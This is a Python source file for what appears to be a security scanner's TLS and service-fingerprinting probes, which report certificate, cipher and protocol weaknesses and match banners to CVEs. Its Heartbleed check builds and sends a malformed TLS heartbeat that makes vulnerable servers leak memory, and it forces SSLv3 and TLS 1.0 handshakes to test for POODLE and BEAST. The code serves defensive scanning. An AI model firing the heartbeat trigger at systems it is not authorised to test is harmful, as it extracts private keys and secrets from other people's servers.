import random
import re as _re
import socket
import struct
import ssl

import requests

from ...findings import Finding, Severity, probe_result, probe_error
from ...cve_db import check_cves
from ._base import _ServiceProbeBase


class _ServiceTlsMixin(_ServiceProbeBase):
  """TLS inspection and generic service fingerprinting probes."""

  def _service_info_tls(self, target, port):
    """
    Inspect TLS handshake, certificate chain, and cipher strength.

    Uses a two-pass approach: unverified connect (always gets protocol/cipher),
    then verified connect (detects self-signed / chain issues).

    Parameters
    ----------
    target : str
      Hostname or IP address.
    port : int
      Port being probed.

    Returns
    -------
    dict
      Structured findings with protocol, cipher, cert details.
    """
    from datetime import datetime

    findings = []
    raw = {"protocol": None, "cipher": None, "cert_subject": None, "cert_issuer": None}

    # Pass 1: Unverified — always get protocol/cipher
    proto, cipher, cert_der = self._tls_unverified_connect(target, port)
    if proto is None:
      return probe_error(target, port, "TLS", Exception("unverified connect failed"))

    raw["protocol"], raw["cipher"] = proto, cipher
    findings += self._tls_check_protocol(proto, cipher)

    # Pass 1b: SAN parsing and signature check from DER cert
    if cert_der:
      san_dns, san_ips = self._tls_parse_san_from_der(cert_der)
      raw["san_dns"] = san_dns
      raw["san_ips"] = san_ips
      for ip_str in san_ips:
        try:
          import ipaddress as _ipaddress
          if _ipaddress.ip_address(ip_str).is_private:
            self._emit_metadata("internal_ips", {"ip": ip_str, "source": f"tls_san:{port}"})
        except (ValueError, TypeError):
          pass
      findings += self._tls_check_signature_algorithm(cert_der)
      findings += self._tls_check_validity_period(cert_der)

    # Pass 2: Verified — detect self-signed / chain issues
    findings += self._tls_check_certificate(target, port, raw)

    # Pass 3: Cert content checks (expiry, default CN)
    findings += self._tls_check_expiry(raw)
    findings += self._tls_check_default_cn(raw)

    # Pass 4: Heartbleed (CVE-2014-0160)
    heartbleed = self._tls_check_heartbleed(target, port)
    if heartbleed:
      findings.append(heartbleed)

    # Pass 5: Downgrade attacks (POODLE / BEAST)
    findings += self._tls_check_downgrade(target, port)

    if not findings:
      findings.append(Finding(Severity.INFO, f"TLS {proto} {cipher}", "TLS configuration adequate."))

    return probe_result(raw_data=raw, findings=findings)

  def _tls_unverified_connect(self, target, port):
    """Unverified TLS connect to get protocol, cipher, and DER cert."""
    try:
      ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
      ctx.check_hostname = False
      ctx.verify_mode = ssl.CERT_NONE
      with socket.create_connection((target, port), timeout=3) as sock:
        with ctx.wrap_socket(sock, server_hostname=target) as ssock:
          proto = ssock.version()
          cipher_info = ssock.cipher()
          cipher_name = cipher_info[0] if cipher_info else "unknown"
          cert_der = ssock.getpeercert(binary_form=True)
          return proto, cipher_name, cert_der
    except Exception as e:
      self.P(f"TLS unverified connect failed on {target}:{port}: {e}", color='y')
      return None, None, None

  def _tls_check_protocol(self, proto, cipher):
    """Flag obsolete TLS/SSL protocols and weak ciphers."""
    findings = []
    if proto and proto.upper() in ("SSLV2", "SSLV3", "TLSV1", "TLSV1.1"):
      findings.append(Finding(
        severity=Severity.HIGH,
        title=f"Obsolete TLS protocol: {proto}",
        description=f"Server negotiated {proto} with cipher {cipher}. "
                    f"SSLv2/v3 and TLS 1.0/1.1 are deprecated and vulnerable.",
        evidence=f"protocol={proto}, cipher={cipher}",
        remediation="Disable SSLv2/v3/TLS 1.0/1.1 and require TLS 1.2+.",
        owasp_id="A02:2021",
        cwe_id="CWE-326",
        confidence="certain",
      ))
    if cipher and any(w in cipher.lower() for w in ("rc4", "des", "null", "export")):
      findings.append(Finding(
        severity=Severity.HIGH,
        title=f"Weak TLS cipher: {cipher}",
        description=f"Cipher {cipher} is considered cryptographically weak.",
        evidence=f"cipher={cipher}",
        remediation="Disable weak ciphers (RC4, DES, NULL, EXPORT).",
        owasp_id="A02:2021",
        cwe_id="CWE-327",
        confidence="certain",
      ))
    return findings

  def _tls_check_certificate(self, target, port, raw):
    """Verified TLS pass — detect self-signed, untrusted issuer, hostname mismatch."""
    from datetime import datetime

    findings = []
    try:
      ctx = ssl.create_default_context()
      with socket.create_connection((target, port), timeout=3) as sock:
        with ctx.wrap_socket(sock, server_hostname=target) as ssock:
          cert = ssock.getpeercert()
          subj = dict(x[0] for x in cert.get("subject", ()))
          issuer = dict(x[0] for x in cert.get("issuer", ()))
          raw["cert_subject"] = subj.get("commonName")
          raw["cert_issuer"] = issuer.get("organizationName") or issuer.get("commonName")
          raw["cert_not_after"] = cert.get("notAfter")
    except ssl.SSLCertVerificationError as e:
      err_msg = str(e).lower()
      if "self-signed" in err_msg or "self signed" in err_msg:
        findings.append(Finding(
          severity=Severity.MEDIUM,
          title="Self-signed TLS certificate",
          description="The server presents a self-signed certificate that browsers will reject.",
          evidence=str(e),
          remediation="Replace with a certificate from a trusted CA.",
          owasp_id="A02:2021",
          cwe_id="CWE-295",
          confidence="certain",
        ))
      elif "hostname mismatch" in err_msg:
        findings.append(Finding(
          severity=Severity.MEDIUM,
          title="TLS certificate hostname mismatch",
          description=f"Certificate CN/SAN does not match {target}.",
          evidence=str(e),
          remediation="Ensure the certificate covers the served hostname.",
          owasp_id="A02:2021",
          cwe_id="CWE-295",
          confidence="certain",
        ))
      else:
        findings.append(Finding(
          severity=Severity.MEDIUM,
          title="TLS certificate validation failed",
          description="Certificate chain could not be verified.",
          evidence=str(e),
          remediation="Use a certificate from a trusted CA with a valid chain.",
          owasp_id="A02:2021",
          cwe_id="CWE-295",
          confidence="firm",
        ))
    except Exception:
      pass  # Non-cert errors (connection reset, etc.) — skip
    return findings

  def _tls_check_expiry(self, raw):
    """Check certificate expiry from raw dict."""
    from datetime import datetime

    findings = []
    expires = raw.get("cert_not_after")
    if not expires:
      return findings
    try:
      exp = datetime.strptime(expires, "%b %d %H:%M:%S %Y %Z")
      days = (exp - datetime.utcnow()).days
      raw["cert_days_remaining"] = days
      if days < 0:
        findings.append(Finding(
          severity=Severity.HIGH,
          title=f"TLS certificate expired ({-days} days ago)",
          description="The certificate has already expired.",
          evidence=f"notAfter={expires}",
          remediation="Renew the certificate immediately.",
          owasp_id="A02:2021",
          cwe_id="CWE-298",
          confidence="certain",
        ))
      elif days <= 30:
        findings.append(Finding(
          severity=Severity.MEDIUM,
          title=f"TLS certificate expiring soon ({days} days)",
          description=f"Certificate expires in {days} days.",
          evidence=f"notAfter={expires}",
          remediation="Renew the certificate before expiry.",
          owasp_id="A02:2021",
          cwe_id="CWE-298",
          confidence="certain",
        ))
    except Exception:
      pass
    return findings

  def _tls_check_default_cn(self, raw):
    """Flag placeholder common names."""
    findings = []
    cn = raw.get("cert_subject")
    if not cn:
      return findings
    cn_lower = cn.lower()
    placeholders = ("example.com", "localhost", "internet widgits", "test", "changeme", "my company", "acme", "default")
    if any(p in cn_lower for p in placeholders) or len(cn.strip()) <= 1:
      findings.append(Finding(
        severity=Severity.LOW,
        title=f"TLS certificate placeholder CN: {cn}",
        description="Certificate uses a default/placeholder common name.",
        evidence=f"CN={cn}",
        remediation="Replace with a certificate bearing the correct hostname.",
        owasp_id="A02:2021",
        cwe_id="CWE-295",
        confidence="firm",
      ))
    return findings

  def _tls_parse_san_from_der(self, cert_der):
    """Parse SAN DNS names and IP addresses from a DER-encoded certificate."""
    dns_names, ip_addresses = [], []
    if not cert_der:
      return dns_names, ip_addresses
    try:
      from cryptography import x509
      cert = x509.load_der_x509_certificate(cert_der)
      try:
        san_ext = cert.extensions.get_extension_for_class(x509.SubjectAlternativeName)
        dns_names = san_ext.value.get_values_for_type(x509.DNSName)
        ip_addresses = [str(ip) for ip in san_ext.value.get_values_for_type(x509.IPAddress)]
      except x509.ExtensionNotFound:
        pass
    except Exception:
      pass
    return dns_names, ip_addresses

  def _tls_check_signature_algorithm(self, cert_der):
    """Flag SHA-1 or MD5 signature algorithms."""
    findings = []
    if not cert_der:
      return findings
    try:
      from cryptography import x509
      from cryptography.hazmat.primitives import hashes
      cert = x509.load_der_x509_certificate(cert_der)
      algo = cert.signature_hash_algorithm
      if algo and isinstance(algo, (hashes.SHA1, hashes.MD5)):
        algo_name = algo.name.upper()
        findings.append(Finding(
          severity=Severity.MEDIUM,
          title=f"TLS certificate signed with weak algorithm: {algo_name}",
          description=f"The certificate uses {algo_name} for its signature, which is cryptographically weak.",
          evidence=f"signature_algorithm={algo_name}",
          remediation="Replace with a certificate using SHA-256 or stronger.",
          owasp_id="A02:2021",
          cwe_id="CWE-327",
          confidence="certain",
        ))
    except Exception:
      pass
    return findings

  def _tls_check_validity_period(self, cert_der):
    """Flag certificates with a total validity span >5 years (CA/Browser Forum violation)."""
    findings = []
    if not cert_der:
      return findings
    try:
      from cryptography import x509
      cert = x509.load_der_x509_certificate(cert_der)
      span = cert.not_valid_after_utc - cert.not_valid_before_utc
      if span.days > 5 * 365:
        findings.append(Finding(
          severity=Severity.MEDIUM,
          title=f"TLS certificate validity span exceeds 5 years ({span.days} days)",
          description="Certificates valid for more than 5 years violate CA/Browser Forum baseline requirements.",
          evidence=f"not_before={cert.not_valid_before_utc}, not_after={cert.not_valid_after_utc}, span={span.days}d",
          remediation="Reissue with a validity period of 398 days or less.",
          owasp_id="A02:2021",
          cwe_id="CWE-298",
          confidence="certain",
        ))
    except Exception:
      pass
    return findings


  def _tls_check_heartbleed(self, target, port):
    """Test for Heartbleed (CVE-2014-0160) by sending a malformed TLS heartbeat.

    Builds a raw TLS connection, completes handshake, then sends a heartbeat
    request with payload_length > actual payload. If the server responds with
    more data than sent, it is leaking memory.

    Returns
    -------
    Finding or None
      CRITICAL finding if vulnerable, None otherwise.
    """
    try:
      # Connect and perform TLS handshake via ssl module
      ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
      ctx.check_hostname = False
      ctx.verify_mode = ssl.CERT_NONE
      # Allow older protocols for compatibility with vulnerable servers
      ctx.minimum_version = ssl.TLSVersion.MINIMUM_SUPPORTED

      raw_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
      raw_sock.settimeout(3)
      raw_sock.connect((target, port))
      tls_sock = ctx.wrap_socket(raw_sock, server_hostname=target)

      # Get the negotiated TLS version for the heartbeat record
      tls_version = tls_sock.version()
      version_map = {
        "TLSv1": b"\x03\x01", "TLSv1.1": b"\x03\x02",
        "TLSv1.2": b"\x03\x03", "TLSv1.3": b"\x03\x03",
        "SSLv3": b"\x03\x00",
      }
      tls_ver_bytes = version_map.get(tls_version, b"\x03\x01")

      # Build heartbeat request (ContentType=24, HeartbeatMessageType=1=request)
      # payload_length is set to 16384 but actual payload is only 1 byte
      # This is the essence of the Heartbleed attack: asking for more data than sent
      hb_payload = b"\x01"  # 1 byte actual payload
      hb_msg = (
        b"\x01"               # HeartbeatMessageType: request
        + b"\x40\x00"         # payload_length: 16384 (0x4000)
        + hb_payload           # actual payload: 1 byte
        + b"\x00" * 16        # padding (16 bytes)
      )

      # TLS record: ContentType=24 (Heartbeat), version, length
      tls_record = (
        b"\x18"               # ContentType: Heartbeat
        + tls_ver_bytes        # TLS version
        + struct.pack(">H", len(hb_msg))
        + hb_msg
      )

      # Send via the underlying raw socket (bypassing ssl module)
      # We need to access the raw socket after handshake
      # The ssl wrapper doesn't let us send raw records, so use raw_sock.
      # After wrap_socket, raw_sock is consumed. Instead, use tls_sock.unwrap()
      # to get the raw socket back.
      try:
        raw_after = tls_sock.unwrap()
        raw_after.sendall(tls_record)
        raw_after.settimeout(3)
        response = raw_after.recv(65536)
        raw_after.close()
      except (ssl.SSLError, OSError):
        # If unwrap fails, try closing and testing with a new raw connection
        tls_sock.close()
        return self._tls_heartbleed_raw(target, port, tls_ver_bytes)

      if response and len(response) >= 7:
        # Check if response is a heartbeat response (ContentType=24)
        if response[0] == 24:
          resp_len = struct.unpack(">H", response[3:5])[0]
          # If server sent back more than we sent (3 bytes of heartbeat msg),
          # it leaked memory
          if resp_len > len(hb_msg):
            return Finding(
              severity=Severity.CRITICAL,
              title="TLS Heartbleed vulnerability (CVE-2014-0160)",
              description=f"Server at {target}:{port} is vulnerable to Heartbleed. "
                          "An attacker can read up to 64KB of server memory per request, "
                          "potentially exposing private keys, session tokens, and passwords.",
              evidence=f"Heartbeat response size ({resp_len} bytes) > request payload size ({len(hb_msg)} bytes). "
                       f"Leaked {resp_len - len(hb_msg)} bytes of server memory.",
              remediation="Upgrade OpenSSL to 1.0.1g or later and regenerate all private keys and certificates.",
              owasp_id="A06:2021",
              cwe_id="CWE-126",
              confidence="certain",
            )
        # TLS Alert (ContentType=21) = not vulnerable (server rejected heartbeat)
        elif response[0] == 21:
          return None

    except Exception:
      pass
    return None

  def _tls_heartbleed_raw(self, target, port, tls_ver_bytes):
    """Fallback Heartbleed test using a raw TLS ClientHello with heartbeat extension.

    This is needed when ssl.unwrap() fails. We build a minimal TLS 1.0
    ClientHello that advertises the heartbeat extension, complete the handshake,
    and then send the malformed heartbeat.

    Returns
    -------
    Finding or None
    """
    try:
      sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
      sock.settimeout(5)
      sock.connect((target, port))

      # Minimal TLS 1.0 ClientHello with heartbeat extension
      # This is a simplified approach: we use struct to build the exact bytes
      hello = bytearray()
      # Handshake header: ClientHello (0x01)
      # Random: 32 bytes
      client_random = random.randbytes(32)
      # Session ID: 0 bytes
      # Cipher suites: a few common ones
      ciphers = (
        b"\x00\x2f"  # TLS_RSA_WITH_AES_128_CBC_SHA
        b"\x00\x35"  # TLS_RSA_WITH_AES_256_CBC_SHA
        b"\x00\x0a"  # TLS_RSA_WITH_3DES_EDE_CBC_SHA
      )
      # Compression: null only
      compression = b"\x01\x00"
      # Extensions: heartbeat (type 0x000f, length 1, mode=1 peer allowed to send)
      heartbeat_ext = struct.pack(">HH", 0x000f, 1) + b"\x01"
      extensions = heartbeat_ext

      client_hello_body = (
        b"\x03\x01"  # TLS 1.0
        + client_random
        + b"\x00"  # Session ID length: 0
        + struct.pack(">H", len(ciphers)) + ciphers
        + compression
        + struct.pack(">H", len(extensions)) + extensions
      )

      # Handshake message: type=1 (ClientHello), length
      handshake = b"\x01" + struct.pack(">I", len(client_hello_body))[1:] + client_hello_body

      # TLS record: ContentType=22 (Handshake), version=TLS 1.0
      tls_record = b"\x16\x03\x01" + struct.pack(">H", len(handshake)) + handshake
      sock.sendall(tls_record)

      # Read ServerHello + Certificate + ServerHelloDone
      # We just need to consume enough to complete the handshake
      server_response = b""
      for _ in range(10):
        try:
          chunk = sock.recv(16384)
          if not chunk:
            break
          server_response += chunk
          # Check if we received ServerHelloDone (handshake type 0x0e)
          if b"\x0e\x00\x00\x00" in server_response:
            break
        except (socket.timeout, OSError):
          break

      if not server_response:
        sock.close()
        return None

      # Now send the malformed heartbeat
      hb_msg = b"\x01\x40\x00" + b"\x41" + b"\x00" * 16  # type=request, length=16384, 1 byte payload + padding
      hb_record = b"\x18\x03\x01" + struct.pack(">H", len(hb_msg)) + hb_msg
      sock.sendall(hb_record)

      # Read response
      sock.settimeout(3)
      try:
        response = sock.recv(65536)
      except (socket.timeout, OSError):
        response = b""
      sock.close()

      if response and len(response) >= 7 and response[0] == 24:
        resp_payload_len = struct.unpack(">H", response[3:5])[0]
        if resp_payload_len > len(hb_msg):
          return Finding(
            severity=Severity.CRITICAL,
            title="TLS Heartbleed vulnerability (CVE-2014-0160)",
            description=f"Server at {target}:{port} is vulnerable to Heartbleed. "
                        "An attacker can read up to 64KB of server memory per request, "
                        "potentially exposing private keys, session tokens, and passwords.",
            evidence=f"Heartbeat response ({resp_payload_len} bytes) exceeded request size.",
            remediation="Upgrade OpenSSL to 1.0.1g or later and regenerate all private keys and certificates.",
            owasp_id="A06:2021",
            cwe_id="CWE-126",
            confidence="certain",
          )
    except Exception:
      pass
    return None

  def _tls_check_downgrade(self, target, port):
    """Test for TLS downgrade vulnerabilities (POODLE, BEAST).

    Returns list of findings.
    """
    findings = []

    # --- POODLE: Test SSLv3 acceptance ---
    try:
      ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
      ctx.check_hostname = False
      ctx.verify_mode = ssl.CERT_NONE
      ctx.maximum_version = ssl.TLSVersion.SSLv3
      ctx.minimum_version = ssl.TLSVersion.SSLv3
      sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
      sock.settimeout(3)
      sock.connect((target, port))
      tls_sock = ctx.wrap_socket(sock, server_hostname=target)
      negotiated = tls_sock.version()
      tls_sock.close()
      if negotiated and "SSL" in negotiated:
        findings.append(Finding(
          severity=Severity.HIGH,
          title="Server accepts SSLv3 — vulnerable to POODLE (CVE-2014-3566)",
          description=f"TLS on {target}:{port} accepts SSLv3 connections. "
                      "The POODLE attack allows decrypting SSLv3 traffic using CBC cipher padding oracles.",
          evidence=f"Negotiated {negotiated} when SSLv3 was forced.",
          remediation="Disable SSLv3 entirely on the server.",
          owasp_id="A02:2021",
          cwe_id="CWE-757",
          confidence="certain",
        ))
    except (ssl.SSLError, OSError):
      pass  # SSLv3 rejected or not available in runtime — good

    # --- BEAST: Test TLS 1.0 with CBC cipher ---
    try:
      ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
      ctx.check_hostname = False
      ctx.verify_mode = ssl.CERT_NONE
      ctx.maximum_version = ssl.TLSVersion.TLSv1
      ctx.minimum_version = ssl.TLSVersion.TLSv1
      sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
      sock.settimeout(3)
      sock.connect((target, port))
      tls_sock = ctx.wrap_socket(sock, server_hostname=target)
      negotiated = tls_sock.version()
      cipher_info = tls_sock.cipher()
      tls_sock.close()
      if negotiated and cipher_info:
        cipher_name = cipher_info[0] if cipher_info else ""
        if "CBC" in cipher_name.upper():
          findings.append(Finding(
            severity=Severity.MEDIUM,
            title="TLS 1.0 with CBC cipher — BEAST risk (CVE-2011-3389)",
            description=f"TLS on {target}:{port} accepts TLS 1.0 with CBC-mode cipher '{cipher_name}'. "
                        "The BEAST attack exploits predictable IVs in TLS 1.0 CBC mode.",
            evidence=f"Negotiated {negotiated} with cipher {cipher_name}.",
            remediation="Disable TLS 1.0 or ensure only non-CBC ciphers are used with TLS 1.0.",
            owasp_id="A02:2021",
            cwe_id="CWE-327",
            confidence="certain",
          ))
    except (ssl.SSLError, OSError):
      pass  # TLS 1.0 rejected — good

    return findings

  # Product patterns for generic banner version extraction.
  # Maps regex → CVE DB product name.  Each regex must have a named group 'ver'.
  _GENERIC_BANNER_PATTERNS = [
    (_re.compile(r'OpenSSH[_\s](?P<ver>\d+\.\d+(?:\.\d+)?)', _re.I), "openssh"),
    (_re.compile(r'Apache[/ ](?P<ver>\d+\.\d+(?:\.\d+)?)', _re.I), "apache"),
    (_re.compile(r'nginx[/ ](?P<ver>\d+\.\d+(?:\.\d+)?)', _re.I), "nginx"),
    (_re.compile(r'Exim\s+(?P<ver>\d+\.\d+(?:\.\d+)?)', _re.I), "exim"),
    (_re.compile(r'Postfix[/ ]?(?:.*?smtpd)?\s*(?P<ver>\d+\.\d+(?:\.\d+)?)', _re.I), "postfix"),
    (_re.compile(r'ProFTPD\s+(?P<ver>\d+\.\d+(?:\.\d+)?)', _re.I), "proftpd"),
    (_re.compile(r'vsftpd\s+(?P<ver>\d+\.\d+(?:\.\d+)?)', _re.I), "vsftpd"),
    (_re.compile(r'Redis[/ ](?:server\s+)?v?(?P<ver>\d+\.\d+(?:\.\d+)?)', _re.I), "redis"),
    (_re.compile(r'Samba\s+(?P<ver>\d+\.\d+(?:\.\d+)?)', _re.I), "samba"),
    (_re.compile(r'Asterisk\s+(?P<ver>\d+\.\d+(?:\.\d+)?)', _re.I), "asterisk"),
    (_re.compile(r'MySQL[/ ](?P<ver>\d+\.\d+(?:\.\d+)?)', _re.I), "mysql"),
    (_re.compile(r'PostgreSQL\s+(?P<ver>\d+\.\d+(?:\.\d+)?)', _re.I), "postgresql"),
    (_re.compile(r'MongoDB\s+(?P<ver>\d+\.\d+(?:\.\d+)?)', _re.I), "mongodb"),
    (_re.compile(r'Elasticsearch[/ ](?P<ver>\d+\.\d+(?:\.\d+)?)', _re.I), "elasticsearch"),
    (_re.compile(r'memcached\s+(?P<ver>\d+\.\d+(?:\.\d+)?)', _re.I), "memcached"),
    (_re.compile(r'TightVNC[/ ](?P<ver>\d+\.\d+(?:\.\d+)?)', _re.I), "tightvnc"),
  ]

  def _service_info_generic(self, target, port):
    """
    Attempt a generic TCP banner grab for uncovered ports.

    Performs three checks on the banner:
    1. Version disclosure — flags any product/version string as info leak.
    2. CVE matching — runs extracted versions against the CVE database.
    3. Unauthenticated data exposure — flags services that send data
       without any client request (potential auth bypass).

    Parameters
    ----------
    target : str
      Hostname or IP address.
    port : int
      Port being probed.

    Returns
    -------
    dict
      Structured findings.
    """
    findings = []
    raw = {"banner": None}
    try:
      sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
      sock.settimeout(2)
      sock.connect((target, port))
      raw_bytes = sock.recv(512)
      sock.close()
      if not raw_bytes:
        return None
    except Exception as e:
      return probe_error(target, port, "generic", e)

    # --- Protocol fingerprinting: detect known services on non-standard ports ---
    reclassified = self._generic_fingerprint_protocol(raw_bytes, target, port)
    if reclassified is not None:
      return reclassified

    # --- Standard banner analysis for truly unknown services ---
    data = raw_bytes.decode('utf-8', errors='ignore')
    banner = ''.join(ch if 32 <= ord(ch) < 127 else '.' for ch in data)
    readable = banner.strip().replace('.', '')
    if not readable:
      return None
    raw["banner"] = banner.strip()
    banner_text = raw["banner"]

    # --- 1. Version extraction + CVE check ---
    for pattern, product in self._GENERIC_BANNER_PATTERNS:
      m = pattern.search(banner_text)
      if m:
        version = m.group("ver")
        raw["product"] = product
        raw["version"] = version
        findings.append(Finding(
          severity=Severity.LOW,
          title=f"Service version disclosed: {product} {version}",
          description=f"Banner on {target}:{port} reveals {product} {version}. "
                      "Version disclosure aids attackers in targeting known vulnerabilities.",
          evidence=f"Banner: {banner_text[:80]}",
          remediation="Suppress or genericize the service banner.",
          cwe_id="CWE-200",
          confidence="certain",
        ))
        findings += check_cves(product, version)
        break  # First match wins

    return probe_result(raw_data=raw, findings=findings)

  # Protocol signatures for reclassifying services on non-standard ports.
  # Each entry: (check_function, protocol_name, probe_method_name)
  # Check functions receive raw bytes and return True if matched.
  @staticmethod
  def _is_redis_banner(data):
    """Redis RESP: starts with +, -, :, $, or * (protocol type bytes)."""
    return len(data) > 0 and data[0:1] in (b'+', b'-', b'$', b'*', b':')

  @staticmethod
  def _is_ftp_banner(data):
    """FTP: 220 greeting."""
    return data[:4] in (b'220 ', b'220-')

  @staticmethod
  def _is_smtp_banner(data):
    """SMTP: 220 greeting with SMTP/ESMTP keyword."""
    text = data[:200].decode('utf-8', errors='ignore').upper()
    return text.startswith('220') and ('SMTP' in text or 'ESMTP' in text)

  @staticmethod
  def _is_mysql_handshake(data):
    """MySQL: 3-byte length + seq + protocol version 0x0a."""
    if len(data) > 4:
      payload = data[4:]
      return payload[0:1] == b'\x0a'
    return False

  @staticmethod
  def _is_rsync_banner(data):
    """Rsync: @RSYNCD: version."""
    return data.startswith(b'@RSYNCD:')

  @staticmethod
  def _is_telnet_banner(data):
    """Telnet: IAC (0xFF) followed by WILL/WONT/DO/DONT."""
    return len(data) >= 2 and data[0] == 0xFF and data[1] in (0xFB, 0xFC, 0xFD, 0xFE)

  _PROTOCOL_SIGNATURES = None  # lazy init to avoid forward reference issues

  def _generic_fingerprint_protocol(self, raw_bytes, target, port):
    """Try to identify the protocol from raw banner bytes.

    If a known protocol is detected, reclassifies the port and runs the
    appropriate specialized probe directly.

    Returns
    -------
    dict or None
        Probe result from the specialized probe, or None if no match.
    """
    signatures = [
      (self._is_redis_banner, "redis", "_service_info_redis"),
      (self._is_ftp_banner, "ftp", "_service_info_ftp"),
      (self._is_smtp_banner, "smtp", "_service_info_smtp"),
      (self._is_mysql_handshake, "mysql", "_service_info_mysql"),
      (self._is_rsync_banner, "rsync", "_service_info_rsync"),
      (self._is_telnet_banner, "telnet", "_service_info_telnet"),
    ]

    for check_fn, proto, method_name in signatures:
      try:
        if check_fn(raw_bytes):
          # Reclassify port protocol for future reference
          port_protocols = self.state.get("port_protocols", {})
          old_proto = port_protocols.get(port, "unknown")
          port_protocols[port] = proto
          self.P(f"Protocol reclassified: port {port} {old_proto} → {proto} (banner fingerprint)")

          # Run the specialized probe directly
          probe_fn = getattr(self, method_name, None)
          if probe_fn:
            return probe_fn(target, port)
      except Exception:
        continue
    return None
